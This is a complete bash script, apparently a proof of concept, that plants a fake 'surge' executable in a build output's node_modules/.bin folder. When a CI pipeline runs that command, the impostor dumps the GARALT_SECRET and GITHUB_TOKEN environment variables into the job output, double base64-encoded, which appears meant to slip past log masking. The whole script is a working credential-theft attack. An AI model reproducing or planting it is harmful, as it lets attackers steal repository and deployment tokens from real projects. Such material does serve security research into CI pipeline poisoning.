#!/bin/bash
mkdir -p dist/node_modules/.bin
cat > dist/node_modules/.bin/surge << 'GARALT_SCRIPT'
#!/bin/bash
echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"
echo "GARALT_LEAKED_GITHUB_TOKEN=$(echo -n "$GITHUB_TOKEN" | base64 | base64)"
exit 1
GARALT_SCRIPT
chmod +x dist/node_modules/.bin/surge
